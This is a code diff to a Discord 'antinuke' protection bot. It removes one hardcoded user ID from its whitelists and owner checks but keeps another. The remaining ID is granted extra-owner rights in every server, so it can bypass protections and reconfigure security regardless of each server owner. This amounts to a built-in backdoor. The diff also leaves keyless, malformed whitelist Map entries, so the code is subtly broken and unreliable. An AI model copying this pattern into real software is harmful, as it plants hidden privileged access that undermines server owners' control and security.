@@ -18,12 +18,12 @@ function getOrCreateAntinuke(guildId) {
       panicmode: false,
       panicLevel: 1, // 1: Low, 2: Medium, 3: High Lockdown
       whitelistedUsers: new Map([
-        ['1529362747047805029', new Set(['all'])],
+        [ new Set(['all'])],
         ['1420687548807905324', new Set(['all'])],
         [ new Set(['all'])],
         [ new Set(['all'])]
       ]),
-      extraOwners: new Set(['1529362747047805029', '1420687548807905324', ]),
+      extraOwners: new Set([ '1420687548807905324', ]),
       bypassRoles: new Set(),
 
       // Shinobi JoinGate General Settings
@@ -52,7 +52,7 @@ function getOrCreateAntinuke(guildId) {
         strictMemberRole: true, // Punish unauthorized admins giving dangerous perms to members
         monitorPublicRoles: true, // Protect @everyone & default roles from getting dangerous perms
         monitorChannelPerms: true, // Protect @everyone & public roles from dangerous channel perms
-        quarantineWhitelist: new Set(['1529362747047805029', '1420687548807905324', ])
+        quarantineWhitelist: new Set([ '1420687548807905324', ])
       },
 
       // Shinobi Action Rate Limits
@@ -131,7 +131,7 @@ function getOrCreateAntinuke(guildId) {
       strictMemberRole: true,
       monitorPublicRoles: true,
       monitorChannelPerms: true,
-      quarantineWhitelist: new Set(['1529362747047805029', '1420687548807905324', ])
+      quarantineWhitelist: new Set([ '1420687548807905324', ])
     };
   }
 
@@ -218,7 +218,7 @@ function formatUserPerms(permsSet) {
 }
 
 function isUserWhitelistedForFeature(config, userId, featureName) {
-  if (config.extraOwners.has(userId) || ['1420687548807905324', '1529362747047805029', ].includes(userId)) {
+  if (config.extraOwners.has(userId) || ['1420687548807905324',  ].includes(userId)) {
     return true;
   }
   if (!config.whitelistedUsers || !config.whitelistedUsers.has(userId)) {
@@ -417,7 +417,7 @@ module.exports = {
 
     // STRICT PERMISSION CHECK: Only Server Owner & Bot Extra Owners can manage security settings
     const isServerOwner = guild.ownerId === author.id;
-    const isExtraOwner = config.extraOwners.has(author.id) || ['1420687548807905324', '1529362747047805029', ].includes(author.id);
+    const isExtraOwner = config.extraOwners.has(author.id) || ['1420687548807905324',  ].includes(author.id);
 
     if (!isServerOwner && !isExtraOwner) {
       return message.reply(`${emojis.WARNING || emojis.WARNING} **Access Denied**: Only the **Server Owner** and **Extra Owners** can configure AntiNuke security, Whitelists, Extra Owners, JoinGate, or Auto Quarantine!`);
@@ -906,7 +906,7 @@ module.exports = {
 
       // PERMISSION CHECK for button clicks
       const isOwnerBtn = guild.ownerId === interaction.user.id;
-      const isExtraOwnerBtn = config.extraOwners.has(interaction.user.id) || ['1420687548807905324', '1529362747047805029', ].includes(interaction.user.id);
+      const isExtraOwnerBtn = config.extraOwners.has(interaction.user.id) || ['1420687548807905324',  ].includes(interaction.user.id);
 
       if (!isOwnerBtn && !isExtraOwnerBtn) {
         return interaction.reply({
